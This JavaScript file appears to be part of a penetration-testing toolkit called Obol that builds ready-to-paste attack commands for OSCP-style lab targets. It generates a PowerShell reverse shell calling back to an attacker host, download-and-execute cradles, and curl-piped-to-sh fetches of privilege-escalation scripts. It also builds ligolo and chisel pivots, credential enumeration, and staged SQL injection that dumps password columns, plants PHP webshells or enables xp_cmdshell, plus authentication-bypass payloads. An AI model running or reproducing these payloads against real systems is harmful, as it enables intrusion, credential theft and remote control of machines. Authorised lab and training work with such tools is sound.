// Obol v2.5 script-builder profiles — contextual toggles and engagement-aware rendering.
(function(root){
'use strict';
const profiles={};
function val(params,st,key,fallback){return String((st.args||{})[key]||params[key]||fallback||'');}
function on(st,key){return !!(st.selected||{})[key];}
function radio(st,key,fallback){return String((st.radio||{})[key]||fallback||'');}
profiles['ps-rev']={
  controls:[{type:'toggle',id:'listener',label:'Include Kali listener command',default:true},{type:'arg',id:'lhost',label:'Callback host',placeholder:'10.10.14.5'},{type:'arg',id:'lport',label:'Callback port',placeholder:'4444'}],
  build:(base,p,s)=>{const h=val(p,s,'lhost','{{lhost}}'),port=val(p,s,'lport','{{lport}}');const shell=`$c=New-Object System.Net.Sockets.TCPClient('${h}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()`;return (on(s,'listener')?`# Kali first:\nnc -lvnp ${port}\n# Target:\n`:'')+shell;}
};
profiles['cradles']={
  controls:[{type:'radio',id:'method',label:'Transfer method',default:'iwr',options:[{value:'iwr',label:'Invoke-WebRequest to disk'},{value:'webclient',label:'WebClient in-memory PowerShell'},{value:'certutil',label:'certutil LOLBIN'}]},{type:'arg',id:'filename',label:'Source filename',default:'winPEASany.exe',placeholder:'tool.exe'},{type:'arg',id:'dest',label:'Destination path',default:'C:\\Users\\Public\\w.exe',placeholder:'C:\\Users\\Public\\w.exe'},{type:'arg',id:'port',label:'HTTP server port',default:'80',placeholder:'80'},{type:'toggle',id:'server',label:'Include Kali HTTP server command',default:true}],
  build:(base,p,s)=>{const file=val(p,s,'filename','tool.exe'),dest=val(p,s,'dest','C:\\Users\\Public\\w.exe'),port=val(p,s,'port','80'),host=p.lhost||'{{lhost}}',url=`http://${host}${port==='80'?'':':'+port}/${file}`;let cmd='';if(radio(s,'method','iwr')==='webclient')cmd=`IEX(New-Object Net.WebClient).DownloadString('${url}')`;else if(radio(s,'method','iwr')==='certutil')cmd=`certutil -urlcache -split -f ${url} ${dest}`;else cmd=`iwr ${url} -OutFile ${dest}`;return (on(s,'server')?`# Kali:\npython3 -m http.server ${port}\n# Target:\n`:'')+cmd;}
};
profiles['tty']={
  controls:[{type:'radio',id:'method',label:'PTY method',default:'python3',options:[{value:'python3',label:'python3 pty.spawn'},{value:'python',label:'python pty.spawn'},{value:'script',label:'script utility'}]},{type:'arg',id:'term',label:'TERM value',default:'xterm',placeholder:'xterm'},{type:'toggle',id:'stty',label:'Include stty/foreground steps',default:true}],
  build:(base,p,s)=>{const m=radio(s,'method','python3'),term=val(p,s,'term','xterm');let first=m==='script'?`script -qc /bin/bash /dev/null`:`${m} -c 'import pty;pty.spawn("/bin/bash")'`;return first+(on(s,'stty')?`\n# Ctrl+Z, then on Kali:\nstty raw -echo; fg\n# Back in target shell:\nexport TERM=${term}`:'');}
};
profiles['proof-snap']={
  controls:[{type:'radio',id:'platform',label:'Target platform',default:'linux',options:[{value:'linux',label:'Linux'},{value:'windows',label:'Windows'}]},{type:'radio',id:'flag',label:'Proof file',default:'proof',options:[{value:'proof',label:'proof.txt'},{value:'local',label:'local.txt'}]}],
  build:(base,p,s)=>{const win=radio(s,'platform','linux')==='windows',flag=radio(s,'flag','proof');if(win)return flag==='proof'?`type C:\\Users\\Administrator\\Desktop\\proof.txt & ipconfig`:`type C:\\Users\\*\\Desktop\\local.txt & ipconfig`;return flag==='proof'?`cat /root/proof.txt; ip addr`:`cat /home/*/local.txt; ip addr`;}
};
profiles['ligolo-quick']={
  controls:[{type:'arg',id:'port',label:'Proxy listen port',default:'11601',placeholder:'11601'},{type:'arg',id:'tun',label:'Tunnel interface',default:'ligolo',placeholder:'ligolo'},{type:'arg',id:'subnet',label:'Internal route',default:'10.10.10.0/24',placeholder:'10.10.10.0/24'},{type:'toggle',id:'selfcert',label:'Use self-signed proxy certificate',default:true},{type:'toggle',id:'ignorecert',label:'Agent ignores certificate validation',default:true},{type:'toggle',id:'route',label:'Include route command',default:true}],
  build:(base,p,s)=>{const port=val(p,s,'port','11601'),tun=val(p,s,'tun','ligolo'),subnet=val(p,s,'subnet','10.10.10.0/24'),host=p.lhost||'{{lhost}}';return `# Kali\nsudo ip tuntap add user $(whoami) mode tun ${tun}\nsudo ip link set ${tun} up\n./proxy${on(s,'selfcert')?' -selfcert':''} -laddr 0.0.0.0:${port}\n# Target\n./agent -connect ${host}:${port}${on(s,'ignorecert')?' -ignore-cert':''}\n# Ligolo console\nsession\nstart`+(on(s,'route')?`\n# Kali\nsudo ip route add ${subnet} dev ${tun}`:'');}
};
profiles['chisel-quick']={
  controls:[{type:'radio',id:'mode',label:'Tunnel mode',default:'socks',options:[{value:'socks',label:'Reverse SOCKS'},{value:'forward',label:'Reverse single-port forward'}]},{type:'arg',id:'serverPort',label:'Chisel server port',default:'9000',placeholder:'9000'},{type:'arg',id:'socksPort',label:'Local SOCKS port',default:'1080',placeholder:'1080'},{type:'arg',id:'internalHost',label:'Internal destination host',placeholder:'10.10.10.20'},{type:'arg',id:'internalPort',label:'Internal destination port',default:'80',placeholder:'80'},{type:'arg',id:'exposePort',label:'Kali exposed port',default:'8080',placeholder:'8080'}],
  build:(base,p,s)=>{const sp=val(p,s,'serverPort','9000'),host=p.lhost||'{{lhost}}';if(radio(s,'mode','socks')==='forward'){const ih=val(p,s,'internalHost',p.target||'10.10.10.20'),ip=val(p,s,'internalPort','80'),ep=val(p,s,'exposePort','8080');return `# Kali\n./chisel server -p ${sp} --reverse\n# Target\n./chisel client ${host}:${sp} R:${ep}:${ih}:${ip}\n# Kali use\ncurl http://127.0.0.1:${ep}`;}const socks=val(p,s,'socksPort','1080');return `# Kali\n./chisel server -p ${sp} --reverse\n# Target\n./chisel client ${host}:${sp} R:${socks}:socks\n# proxychains config\nsocks5 127.0.0.1 ${socks}`;}
};
profiles['portscan-ps']={
  controls:[{type:'arg',id:'start',label:'First port',default:'1',placeholder:'1'},{type:'arg',id:'end',label:'Last port',default:'1024',placeholder:'1024'},{type:'arg',id:'target',label:'Destination host',placeholder:'10.10.10.20'}],
  build:(base,p,s)=>{const a=val(p,s,'start','1'),b=val(p,s,'end','1024'),t=val(p,s,'target',p.target||'{{target}}');return `${a}..${b} | ForEach-Object { if (Test-NetConnection -Port $_ -ComputerName ${t} -InformationLevel Quiet -WarningAction SilentlyContinue) { "$_ open" } }`;}
};
profiles['win-pe-quick']={
  controls:[{type:'toggle',id:'priv',label:'Privileges (whoami /priv)',default:true},{type:'toggle',id:'system',label:'OS/version baseline',default:true},{type:'toggle',id:'history',label:'PowerShell history',default:true},{type:'toggle',id:'cmdkey',label:'Saved credentials',default:true},{type:'toggle',id:'uninstall',label:'Installed application paths',default:true}],
  build:(base,p,s)=>{const rows=[];if(on(s,'priv'))rows.push('whoami /priv');if(on(s,'system'))rows.push('systeminfo | findstr /B /C:"OS Name" /C:"OS Version"');if(on(s,'history'))rows.push("cat (Get-PSReadlineOption).HistorySavePath");if(on(s,'cmdkey'))rows.push('cmdkey /list');if(on(s,'uninstall'))rows.push('reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s | findstr InstallLocation');return rows.join('\n');}
};
profiles['peas-fetch']={
  controls:[{type:'radio',id:'platform',label:'Target platform',default:'linux',options:[{value:'linux',label:'Linux / linPEAS'},{value:'windows',label:'Windows / winPEAS'}]},{type:'arg',id:'port',label:'HTTP server port',default:'80',placeholder:'80'},{type:'toggle',id:'server',label:'Include Kali HTTP server command',default:true}],
  build:(base,p,s)=>{const port=val(p,s,'port','80'),host=p.lhost||'{{lhost}}',prefix=`http://${host}${port==='80'?'':':'+port}`;const cmd=radio(s,'platform','linux')==='windows'?`iwr ${prefix}/winpeas/winPEASany.exe -OutFile C:\\Users\\Public\\w.exe`:`curl ${prefix}/linpeas/linpeas.sh | sh`;return (on(s,'server')?`# Kali\npython3 -m http.server ${port}\n# Target\n`:'')+cmd;}
};
// Manual SQLi is an engine-aware tool: pick the DB engine and the builder re-writes every
// stage in that dialect (fingerprint funcs, schema navigation, string concat, blind/error
// probes, and the RCE path). Endpoint path / parameter / loot table are engagement args.
const SQLI_DIALECTS={
  mysql:{label:'MySQL / MariaDB',ver:'@@version',db:'database()',user:'current_user()',
    navigate:tbl=>[
      ['-1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata -- -','all databases'],
      ['-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -','tables in current DB'],
      ["-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='"+tbl+"' -- -",'columns of '+tbl]],
    dump:tbl=>'-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM '+tbl+' -- -',
    blind:[
      ['1 AND extractvalue(1,concat(0x7e,(SELECT database()))) -- -','error-based (leaks in the error)'],
      ["1 AND substring((SELECT database()),1,1)='a' -- -",'blind boolean (char by char)'],
      ["1 AND IF(substring((SELECT database()),1,1)='a',sleep(3),0) -- -",'blind time (3s delay = true)']],
    rce:(U,t)=>[
      'curl -s "'+U+"-1 UNION SELECT 1,'<?php system($_GET[0]);?>',3 INTO OUTFILE '/var/www/html/s.php' -- -"+'"   # needs FILE priv + known webroot',
      'curl -s "http://'+t+'/s.php?0=id"   # run commands through the webshell']},
  mssql:{label:'Microsoft SQL Server',ver:'@@version',db:'DB_NAME()',user:'SYSTEM_USER',
    navigate:tbl=>[
      ['-1 UNION SELECT 1,name,3 FROM master..sysdatabases -- -','all databases (one row per request)'],
      ['-1 UNION SELECT 1,table_name,3 FROM information_schema.tables -- -','tables (one per request)'],
      ["-1 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='"+tbl+"' -- -",'columns of '+tbl]],
    dump:tbl=>"-1 UNION SELECT 1,CONCAT(username,':',password),3 FROM "+tbl+' -- -   (one row per request)',
    blind:[
      ['1 AND 1=CONVERT(int,@@version) -- -','error-based (leaks in the convert error)'],
      ["1; IF (ASCII(SUBSTRING((SELECT DB_NAME()),1,1))=97) WAITFOR DELAY '0:0:3' -- -",'blind time (stacked; 3s = char is a)']],
    rce:(U,t)=>[
      'curl -s "'+U+"1; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami' -- -"+'"   # enable + run xp_cmdshell (needs sysadmin)']},
  postgres:{label:'PostgreSQL',ver:'version()',db:'current_database()',user:'current_user',
    navigate:tbl=>[
      ["-1 UNION SELECT 1,string_agg(datname,','),3 FROM pg_database -- -",'all databases'],
      ["-1 UNION SELECT 1,string_agg(table_name,','),3 FROM information_schema.tables WHERE table_schema='public' -- -",'tables in public schema'],
      ["-1 UNION SELECT 1,string_agg(column_name,','),3 FROM information_schema.columns WHERE table_name='"+tbl+"' -- -",'columns of '+tbl]],
    dump:tbl=>"-1 UNION SELECT 1,string_agg(username||':'||password,','),3 FROM "+tbl+' -- -',
    blind:[
      ['1 AND 1=CAST((SELECT version()) AS int) -- -','error-based (leaks in the cast error)'],
      ["1 AND substr((SELECT current_database()),1,1)='a' -- -",'blind boolean'],
      ['1 AND 1=(SELECT 1 FROM pg_sleep(3)) -- -','time probe (unconditional 3s; wrap in CASE for boolean-time)']],
    rce:(U,t)=>[
      'curl -s "'+U+"1; COPY (SELECT '<?php system($_GET[0]);?>') TO '/var/www/html/s.php' -- -"+'"   # write webshell via COPY (needs superuser)',
      'curl -s "http://'+t+'/s.php?0=id"   # run commands through the webshell']}
};
profiles['manual-sqli']={
  controls:[
    {type:'radio',id:'engine',label:'Database engine',default:'mysql',options:[{value:'mysql',label:'MySQL / MariaDB'},{value:'mssql',label:'MS SQL Server'},{value:'postgres',label:'PostgreSQL'}]},
    {type:'arg',id:'path',label:'Endpoint path',default:'page.php',placeholder:'page.php'},
    {type:'arg',id:'param',label:'Injected parameter',default:'id',placeholder:'id'},
    {type:'arg',id:'table',label:'Table to loot',default:'users',placeholder:'users'},
    {type:'toggle',id:'detect',label:'Detect + column count',default:true},
    {type:'toggle',id:'navigate',label:'UNION fingerprint + navigate DB',default:true},
    {type:'toggle',id:'extract',label:'Extract / dump rows',default:true},
    {type:'toggle',id:'blind',label:'Error / blind fallbacks',default:false},
    {type:'toggle',id:'rce',label:'RCE stage',default:false}
  ],
  build:(base,p,s)=>{
    const t=val(p,s,'target',p.target||'{{target}}'),path=val(p,s,'path','page.php'),prm=val(p,s,'param','id'),tbl=val(p,s,'table','users');
    const E=SQLI_DIALECTS[radio(s,'engine','mysql')]||SQLI_DIALECTS.mysql;
    const U='http://'+t+'/'+path+'?'+prm+'=';
    const q=(v,c)=>'curl -s "'+U+v+'"'+(c?'   # '+c:'');
    const out=['# '+E.label+' dialect — every request issued by hand'];
    if(on(s,'detect')){out.push('# ---- STAGE 0 · Detect + column count ----',q("1'",'error / changed page = candidate'),q('1 AND 1=1 -- -','true  -> normal page'),q('1 AND 1=2 -- -','false -> different/empty page'),q('1 ORDER BY 1 -- -','bump 2,3,... last that works = column count'));}
    if(on(s,'navigate')){out.push('# ---- STAGE 1 · UNION fingerprint + navigate the DB (N = column count) ----',q('-1 UNION SELECT 1,2,3 -- -','which columns echo?'),q('-1 UNION SELECT 1,'+E.ver+','+E.db+' -- -','engine + current DB'),q('-1 UNION SELECT 1,'+E.user+',3 -- -','current user'));for(const l of E.navigate(tbl))out.push(q(l[0],l[1]));}
    if(on(s,'extract')){out.push('# ---- STAGE 2 · Extract / dump rows ----',q(E.dump(tbl),'dump rows from '+tbl));}
    if(on(s,'blind')){out.push('# ---- STAGE 3 · Error / blind fallbacks (UNION blocked) ----');for(const l of E.blind)out.push(q(l[0],l[1]));}
    if(on(s,'rce')){out.push('# ---- STAGE 4 · RCE (only where engine + privileges allow — the --os-shell equivalent) ----');for(const l of E.rce(U,t))out.push(l);}
    return out.join('\n');
  }
};
const SQLI_LOGIN_PAYLOADS="# ---- Log in as the FIRST user (usually admin) ----\nadmin' -- -\nadmin' #\nadministrator' -- -\n' OR 1=1 -- -\n' OR 1=1 LIMIT 1 -- -\n\n# ---- OR-true (username not matched against a real row) ----\n' OR '1'='1' -- -\n' OR '1'='1\n\" OR \"1\"=\"1\" -- -\n') OR ('1'='1' -- -\nadmin') -- -";
profiles['sqli-login']={
  controls:[
    {type:'arg',id:'path',label:'Login endpoint',default:'login.php',placeholder:'login.php'},
    {type:'arg',id:'userfield',label:'Username field name',default:'username',placeholder:'username'},
    {type:'arg',id:'passfield',label:'Password field name',default:'password',placeholder:'password'},
    {type:'radio',id:'inject',label:'Inject into',default:'username',options:[{value:'username',label:'Username field'},{value:'password',label:'Password field'}]},
    {type:'toggle',id:'curl',label:'Include curl replay',default:true},
    {type:'toggle',id:'burp',label:'Include Burp Intruder note',default:true}
  ],
  build:(base,p,s)=>{
    const t=val(p,s,'target',p.target||'{{target}}'),path=val(p,s,'path','login.php'),uf=val(p,s,'userfield','username'),pf=val(p,s,'passfield','password');
    const injPass=radio(s,'inject','username')==='password';
    const out=['# Paste a payload into the '+(injPass?'PASSWORD':'USERNAME')+' field (other field = anything).','# Success = a redirect, a Set-Cookie session, an authenticated page, or a response','# length different from the "invalid credentials" baseline. Try each comment style.','',SQLI_LOGIN_PAYLOADS];
    if(on(s,'curl')){
      const uval=injPass?'valid_or_any':"admin' -- -",pval=injPass?"' OR 1=1 -- -":'x';
      out.push('','# ---- Replay the login POST with curl ----','curl -s -i -X POST "http://'+t+'/'+path+'" \\','  --data-urlencode "'+uf+'='+uval+'" \\','  --data-urlencode "'+pf+'='+pval+'"');
    }
    if(on(s,'burp')){out.push('','# ---- Spray the whole list with Burp Intruder ----','# Send the login request to Intruder, mark ONLY the '+(injPass?pf:uf)+' value as the','# payload position, load these strings as a Simple list, then sort by status / length.');}
    return out.join('\n');
  }
};
for(const s of root.OBOL_SCRIPTS||[]){if(profiles[s.id])s.builder25=profiles[s.id];}
root.OBOL_SCRIPT_BUILDERS_V25={version:'2.5.0',profiles};
})(typeof window!=='undefined'?window:globalThis);